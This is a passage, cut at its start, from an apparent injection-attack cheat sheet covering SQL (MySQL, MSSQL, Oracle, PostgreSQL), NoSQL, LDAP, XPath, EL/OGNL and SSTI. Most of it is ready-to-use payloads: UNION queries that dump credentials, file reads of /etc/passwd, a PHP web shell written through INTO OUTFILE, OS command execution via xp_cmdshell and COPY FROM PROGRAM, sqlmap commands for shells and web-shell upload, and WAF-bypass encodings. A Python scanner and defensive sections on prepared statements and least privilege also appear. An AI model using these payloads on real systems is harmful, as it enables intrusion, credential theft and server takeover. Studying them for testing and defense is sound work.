' ORDER BY 2--      (success)
' ORDER BY 5--      (fail → column count = 4)

-- Verify with UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   (success → 3 columns)
```

### 3-2. Determine Data Types

```sql
-- Find columns that can output strings
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 3-3. Extract Full DB Info in MySQL

```sql
-- DB version and user
' UNION SELECT @@version,@@user(),database()--

-- All databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- Tables in a specific DB
' UNION SELECT table_name,NULL,NULL 
  FROM information_schema.tables 
  WHERE table_schema='target_db'--

-- Columns in a table
' UNION SELECT column_name,data_type,NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--

-- Multiple columns at once (GROUP_CONCAT)
' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL 
  FROM users--
```

### 3-4. File Read/Write (MySQL)

```sql
-- Read file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

-- Write web shell (requires write permission + no secure_file_priv)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL 
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 4. DBMS Differences

### MySQL

```sql
-- Comments
-- comment
# comment
/*comment*/

-- String concatenation
CONCAT('a','b')
'a' 'b'      (space)

-- Conditional
IF(condition,true,false)
SLEEP(5)

-- System tables
information_schema.tables
information_schema.columns
```

### MSSQL (SQL Server)

```sql
-- Comments
-- comment
/*comment*/

-- String concatenation
'a'+'b'

-- Conditional
CASE WHEN condition THEN true ELSE false END

-- Delay
WAITFOR DELAY '0:0:5'

-- System tables
sys.tables
sys.columns
INFORMATION_SCHEMA.TABLES

-- OS command execution (xp_cmdshell)
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

### Oracle

```sql
-- Comments
-- comment
/*comment*/

-- String concatenation
'a'||'b'
CONCAT('a','b')

-- NULL row handling (DUAL table)
' UNION SELECT NULL FROM DUAL--

-- System tables
all_tables
all_columns
user_tables

-- User information
' UNION SELECT user,NULL FROM dual--
```

### PostgreSQL

```sql
-- Comments
-- comment
/*comment*/

-- String concatenation
'a'||'b'

-- Delay
pg_sleep(5)

-- System catalogs
pg_catalog.pg_tables
information_schema.tables

-- OS commands (superuser)
COPY cmd_exec FROM PROGRAM 'id'
```

---

## 5. SQLMap Practical Usage

### Basic Usage
```bash
# GET parameter
sqlmap -u "http://target.com/page?id=1"

# POST parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=1234"

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123; id=1"

# Header injection
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"
sqlmap -u "http://target.com/" --user-agent="*"
```

### Information Gathering
```bash
# DB list
sqlmap -u "http://target.com/?id=1" --dbs

# Table list
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# Column list
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# Data dump
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# Full dump
sqlmap -u "http://target.com/?id=1" --dump-all
```

### Advanced Options
```bash
# WAF bypass (tamper scripts)
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=randomcase,charencode
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment

# Level/risk adjustment
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3

# Delay (speed control)
sqlmap -u "http://target.com/?id=1" --delay=1

# Get OS shell
sqlmap -u "http://target.com/?id=1" --os-shell

# Upload web shell
sqlmap -u "http://target.com/?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Burp Suite proxy integration
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# Use request file (saved from Burp)
sqlmap -r request.txt

# Include cookie
sqlmap -r request.txt --cookie="auth=1"
```

### Tamper Script List
```
apostrophemask      ' → %EF%BC%87 (Unicode)
base64encode        Base64 encoding
between             Replace > with NOT BETWEEN
charencode          URL encoding
chardoubleencode    Double URL encoding
equaltolike         Replace = with LIKE
greatest            Replace > with GREATEST()
htmlencode          HTML encoding
randomcase          Random mixed case
space2comment       Replace spaces with /**/
space2plus          Replace spaces with +
versionedkeywords   MySQL version comments
```

---

## 6. WAF Bypass Techniques

### Encoding Bypass

```sql
-- URL encoding
' OR 1=1--   →   %27%20OR%201%3D1--

-- Double URL encoding
%27 → %2527

-- Unicode bypass
' → %u0027
UNION → UN%00ION

-- HTML entities
' → &#39;
```

### Keyword Bypass

```sql
-- Insert comments
UN/**/ION SE/**/LECT
UNI%00ON
UNION%20SELECT
/*!UNION*/ /*!SELECT*/

-- Mixed case
UnIoN SeLeCt
uNiOn sElEcT

-- Whitespace bypass
UNION(SELECT)
UNION%09SELECT      (tab)
UNION%0aSELECT      (newline)
UNION%0dSELECT      (CR)

-- Keyword nesting
UNUNIONION SESELECTLECT
```

### Logical Operator Bypass

```sql
-- AND/OR substitution
' && 1=1--
' || 1=1--
' AND 1=1--    →    '&&1=1--
' OR 1=1--     →    '||1=1--
```

---

## 7. Second-Order SQL Injection

Stored in the DB first, then executed when used in another query later

```
Step 1: Register with username = admin'--
        → Safely escaped and stored

Step 2: Password change query:
        UPDATE users SET pw='new' WHERE username='admin'--'
        → admin'-- is used as username, so:
          UPDATE users SET pw='new' WHERE username='admin'
          --' (rest is a comment)
        → admin account's password is changed!
```

---

## 8. NoSQL Injection (MongoDB)

### MongoDB Basic Attacks
```javascript
// Normal query
db.users.find({username: "admin", password: "pass"})

// NoSQL Injection (JSON parameter)
{
  "username": "admin",
  "password": {"$gt": ""}    ← $gt (greater than): true for anything > empty string → all passwords pass
}

// Abuse $where operator
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}   ← Time-based Blind
{"$where": "function(){return true}"}
```

### URL Parameter NoSQL Injection

```
http://target.com/login?username=admin&password[$gt]=
http://target.com/login?username[$regex]=.*&password[$gt]=
```

### Blind NoSQL Injection

```javascript
// Check password length
{"password": {"$regex": "^.{0,10}$"}}   (True if 10 chars or fewer)

// Extract password characters
{"password": {"$regex": "^a"}}   (True if starts with 'a')
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^abc"}}
```

---

## 9. SQL Injection Defenses

### Prepared Statements — The Most Effective Defense
```php
// PHP + PDO (vulnerable code)
$result = $db->query("SELECT * FROM users WHERE id='$id'");

// PHP + PDO (safe code)
$stmt = $db->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$id]);

// Python + MySQL
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

// Java + JDBC
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
stmt.setString(1, userId);
```

### Input Validation and Whitelisting
```python
#!/usr/bin/env python3
"""
requests-based SQL Injection auto-detector
Supports Boolean-based Blind, Error-based, Time-based detection
Usage: python3 sqli_detector.py -u "http://target.com/page?id=1"
        python3 sqli_detector.py -u "http://target.com/login" --post "user=admin&pass=test"
"""
import argparse
import re
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests
from requests import Response


# ── SQL error patterns (by DB) ───────────────────────────────────────────────────────
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL":      [r"you have an error in your sql syntax",
                   r"warning: mysql_", r"mysql_num_rows\(\)"],
    "MSSQL":      [r"unclosed quotation mark", r"incorrect syntax near",
                   r"microsoft ole db provider for sql server"],
    "PostgreSQL": [r"pg_query\(\):", r"unterminated quoted string",
                   r"postgresql.*error"],
    "Oracle":     [r"ora-\d{5}:", r"oracle error", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite.*error", r"no such column:", r"unrecognized token:"],
}

# ── Boolean-based payload pairs ──────────────────────────────────────────
BOOL_PAYLOADS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),        # quote-based
    (" AND 1=1--",   " AND 1=2--"),           # integer-based
    ("') AND ('1'='1", "') AND ('1'='2"),     # with parentheses
]

# ── Time-based payloads (by DB) ────────────────────────────────────────────────
TIME_PAYLOADS: list[str] = [
    "'; SELECT SLEEP(5)--",                  # MySQL
    "'; WAITFOR DELAY '0:0:5'--",            # MSSQL
    "'; SELECT pg_sleep(5)--",               # PostgreSQL
    "' AND SLEEP(5)--",                      # MySQL (AND)
    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL (AND)
]


@dataclass
class ScanResult:
    url: str
    param: str
    method: str
    vuln_type: str
    payload: str
    evidence: str = ""
    db_type: str = "Unknown"


def make_request(
    session: requests.Session,
    url: str,
    method: str,
    params: dict,
    timeout: float = 10,
) -> Optional[Response]:
    try:
        if method.upper() == "GET":
            resp = session.get(url, params=params, timeout=timeout)
        else:
            resp = session.post(url, data=params, timeout=timeout)
        return resp
    except requests.RequestException:
        return None


def detect_error_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
) -> Optional[ScanResult]:
    """Error message-based detection"""
    payloads = ["'", '"', "''", "1'", "1\""]
    for payload in payloads:
        params = {**base_params, param: base_params.get(param, "") + payload}
        resp = make_request(session, url, method, params)
        if resp is None:
            continue
        body = resp.text.lower()
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return ScanResult(
                        url=url, param=param, method=method,
                        vuln_type="Error-based",
                        payload=payload,
                        evidence=re.search(pattern, body, re.IGNORECASE).group()[:80],
                        db_type=db_type,
                    )
    return None


def detect_boolean_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
) -> Optional[ScanResult]:
    """Boolean-based Blind detection"""
    original_val = str(base_params.get(param, "1"))

    for true_payload, false_payload in BOOL_PAYLOADS:
        params_true  = {**base_params, param: original_val + true_payload}
        params_false = {**base_params, param: original_val + false_payload}

        resp_true  = make_request(session, url, method, params_true)
        resp_false = make_request(session, url, method, params_false)

        if resp_true is None or resp_false is None:
            continue

        # Boolean response if length difference > 10%
        len_true, len_false = len(resp_true.text), len(resp_false.text)
        if len_true > 0 and abs(len_true - len_false) / len_true > 0.10:
            return ScanResult(
                url=url, param=param, method=method,
                vuln_type="Boolean-based Blind",
                payload=true_payload,
                evidence=f"True({len_true}B) vs False({len_false}B) difference",
            )
    return None


def detect_time_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
    threshold: float = 4.5,
) -> Optional[ScanResult]:
    """Time-based Blind detection"""
    for payload in TIME_PAYLOADS:
        params = {**base_params, param: str(base_params.get(param, "1")) + payload}
        start = time.monotonic()
        resp = make_request(session, url, method, params, timeout=15)
        elapsed = time.monotonic() - start
        if elapsed >= threshold:
            db_hint = "MySQL" if "SLEEP" in payload else \
                      "MSSQL" if "WAITFOR" in payload else "PostgreSQL"
            return ScanResult(
                url=url, param=param, method=method,
                vuln_type="Time-based Blind",
                payload=payload,
                evidence=f"Response delayed {elapsed:.1f}s",
                db_type=db_hint,
            )
    return None


def scan(
    url: str,
    post_data: Optional[str] = None,
    cookies: Optional[str] = None,
    headers: Optional[dict] = None,
    delay: float = 0.3,
) -> list[ScanResult]:
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi-Detector/2.0)"})
    if headers:
        session.headers.update(headers)
    if cookies:
        for item in cookies.split(";"):
            k, _, v = item.strip().partition("=")
            session.cookies.set(k.strip(), v.strip())

    method = "POST" if post_data else "GET"
    parsed = urlparse(url)

    if method == "GET":
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    else:
        params = dict(pair.split("=", 1) for pair in post_data.split("&") if "=" in pair)

    if not params:
        print(f"[-] No parameters found: {url}")
        return []

    results: list[ScanResult] = []
    for param in params:
        print(f"[*] Scanning parameter: {param}")
        for detect_fn in (detect_error_based, detect_boolean_based, detect_time_based):
            result = detect_fn(session, url, method, params, param)
            if result:
                results.append(result)
                print(f"  [!] {result.vuln_type} found! DB:{result.db_type}  "
                      f"payload:{result.payload!r}  evidence:{result.evidence}")
                break  # Move to next parameter after finding one
        time.sleep(delay)

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SQL Injection Auto-Detector")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--post", help="POST data (e.g., user=admin&pass=1)")
    parser.add_argument("--cookie", help="Cookie string (e.g., session=abc)")
    parser.add_argument("--header", action="append", default=[],
                        help="Extra header (e.g., X-Token:abc), can be used multiple times")
    parser.add_argument("--delay", type=float, default=0.3,
                        help="Delay between requests (sec) (default: 0.3)")
    args = parser.parse_args()

    extra_headers = {}
    for h in args.header:
        k, _, v = h.partition(":")
        extra_headers[k.strip()] = v.strip()

    print(f"[*] Starting SQL Injection scan: {args.url}")
    results = scan(args.url, args.post, args.cookie, extra_headers, args.delay)

    if results:
        print(f"\n[+] Total {len(results)} vulnerabilities found")
        for r in results:
            print(f"  - {r.param} ({r.vuln_type}, {r.db_type})")
    else:
        print("\n[-] No vulnerabilities found (manual verification recommended)")


if __name__ == "__main__":
    main()
```

### Principle of Least Privilege

```sql
-- Create dedicated web application account
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_pass';

-- Grant only necessary privileges (exclude dangerous ones like FILE, SUPER)
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'webapp'@'localhost';

-- Never grant admin privileges
-- GRANT ALL PRIVILEGES ...  ← Dangerous!
```

---

## 10. LDAP Injection

### LDAP Basic Structure and Attack Principle
```
LDAP filter example:
(&(uid=admin)(userPassword=secret))

Attack payload — authentication bypass:
username: admin)(&
password: anything

Resulting filter:
(&(uid=admin)(&)(userPassword=anything))
          → (&) is always True → authentication bypassed!
```

### LDAP Injection Payloads
```
# Authentication bypass
username: *
username: admin)(*
username: *)(uid=*

# Enumerate all users
username: *)(|(uid=*

# Extract attributes (Blind)
username: admin)(|(password=a*
username: admin)(|(password=b*
→ Extract first character of password from response difference
```

### LDAP Injection Defense

```java
// Java: Escape LDAP special characters
import javax.naming.ldap.LdapName;

String safeDN = Filter.encodeValue(userInput);
// Special characters: *, (, ), \, NUL → escaped

// Spring Security LDAP
String query = "(&(uid={0})(objectclass=person))";
// Automatic escaping applied at {0} position
```

---

## 11. ORM Injection / Expression Language Injection

### ORM Injection (HQL, JPQL)
```java
// Vulnerable Hibernate HQL
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);

// Attack:
// username = ' OR '1'='1
// username = admin' AND SLEEP(5)--

// Safe code — parameter binding
Query query = session.createQuery("FROM User WHERE username = :username");
query.setParameter("username", username);
```

### Expression Language Injection (EL/OGNL)
```
EL Injection test payloads:
${7*7}        → vulnerable if outputs 49
#{7*7}        → JSF EL
*{7*7}        → Spring SpEL
${java.lang.Runtime.getRuntime().exec('calc')}

OGNL Injection (Struts2):
%{7*7}
%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}

Server-Side Template Injection (SSTI) similar attacks:
Jinja2:  {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
Twig:    {{7*7}}
FreeMarker: ${7*7}
Velocity: #set($x=7*7)${x}
```

### EL/SSTI Detection and Defense
```bash
# Detection payload list
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}

# Defense: Never insert user input directly into template strings
# Jinja2 safe approach
template = Template("Hello {{ name }}")
template.render(name=user_input)  # Correct method

# Dangerous approach
template = Template("Hello " + user_input)  # SSTI possible!
```

---

## 12. Preventing Mass SQL Injection Exposure

### Bypassing and Defending LIMIT Controls

```sql
-- Attacker: bypasses LIMIT to extract all data
' UNION SELECT user, password FROM users LIMIT 1000--
' UNION SELECT user, password FROM users LIMIT 999999--

-- Extract all at once with GROUP_CONCAT
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
```

```python
#!/usr/bin/env python3
"""
Safe pagination implementation based on SQLAlchemy + Flask
Prepared Statement + max row limit + Rate Limiting
"""
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from sqlalchemy import text, create_engine
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
engine = create_engine("sqlite:///users.db")
Session = sessionmaker(bind=engine)

# Rate Limiter (IP-based)
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per hour", "20 per minute"],
    storage_uri="memory://",
)

MAX_PER_PAGE = 100   # Max rows per page (prevent mass extraction)
ALLOWED_ORDER_COLS = {"id", "username", "created_at"}  # Whitelist


@app.route("/api/users")
@limiter.limit("30 per minute")  # Per-endpoint limit
def list_users():
    # Input validation (type coercion + range limit)
    try:
        page     = max(1, int(request.args.get("page", 1)))
        per_page = min(MAX_PER_PAGE, max(1, int(request.args.get("per_page", 20))))
    except ValueError:
        abort(400, "page/per_page must be integers")

    order_by = request.args.get("order_by", "id")
    if order_by not in ALLOWED_ORDER_COLS:
        abort(400, f"order_by must be one of {ALLOWED_ORDER_COLS}")

    offset = (page - 1) * per_page

    # Parameter binding with Prepared Statement (SQL Injection defense)
    # order_by already validated by whitelist, so direct formatting allowed
    with Session() as session:
        rows = session.execute(
            text(f"SELECT id, username, email FROM users "
                 f"ORDER BY {order_by} "
                 f"LIMIT :limit OFFSET :offset"),
            {"limit": per_page, "offset": offset},
        ).fetchall()

    return jsonify({
        "page": page,
        "per_page": per_page,
        "data": [{"id": r.id, "username": r.username} for r in rows],
    })
```

---

## 13. XPath Injection

### XPath Basic Structure and Attack Principle
```
XPath is a language for navigating XML documents
XPath injection occurs in XML-based applications (SOAP services, etc.)

Vulnerable XPath query example:
  /users/user[username/text()='admin' and password/text()='pass']

Authentication bypass payloads:
  username: admin' or '1'='1
  username: ' or 1=1 or '
  username: admin']/..  (path traversal)

Resulting query:
  /users/user[username/text()='admin' or '1'='1' and password/text()='...']
  → Always True → authentication bypassed

Boolean-based Blind XPath:
  username: admin' and string-length(//user[1]/password)=6 and '1'='1
  → Guess password length

Character extraction:
  username: admin' and substring(//user[1]/password,1,1)='a' and '1'='1
```

### XPath Injection Defense
```python
# Python lxml: parameter binding
from lxml import etree

# Vulnerable approach
xpath = f"//user[@name='{username}']"
tree.xpath(xpath)  # Dangerous!

# Safe approach (lxml Extension Functions)
from lxml.etree import XPath
query = XPath("//user[@name=$name]")
result = query(tree, name=username)  # Parameter binding

# Java JAXP
// No standard for XPath parameter binding, so input escaping is needed
// Special characters: ' " < > & → escape as XML entities
```

---

## 14. PostgreSQL-Specific Attack Techniques

```sql
-- Check PostgreSQL superuser
SELECT current_user, session_user, pg_is_in_recovery();

-- Read file with pg_read_file() (requires superuser)
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- Execute OS commands with COPY (PostgreSQL 9.3+)
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Upload/download files with lo_import / lo_export
SELECT lo_import('/tmp/shell.php');
SELECT lo_export(OID, '/var/www/html/shell.php');

-- Extensions (superuser)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_exec('host=localhost dbname=postgres', 'SELECT pg_sleep(5)');

-- PostgreSQL version info
SELECT version();
SELECT pg_version_num();
```

---

## 15. SQL Injection Practice Environment

```bash
# DVWA (Damn Vulnerable Web Application)
docker run -d -p 80:80 vulnerables/web-dvwa

# SQLi-labs
docker run -d -p 8080:80 acgpiano/sqli-labs

# WebGoat
docker run -d -p 8080:8080 webgoat/webgoat

# Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

### Practice Scenarios
```
1. DVWA → SQL Injection section
   - Security: Low → Manual SQL Injection attack
   - Security: Medium → GET → POST bypass
   - Security: High → Session-based bypass

2. SQLi-labs
   - Less-1 ~ 5: Basic error-based
   - Less-6 ~ 10: Double quotes
   - Less-11 ~ 20: POST-based
   - Less-21 ~ 37: Cookie/header-based

3. HackTheBox / TryHackMe SQL Injection challenges
```
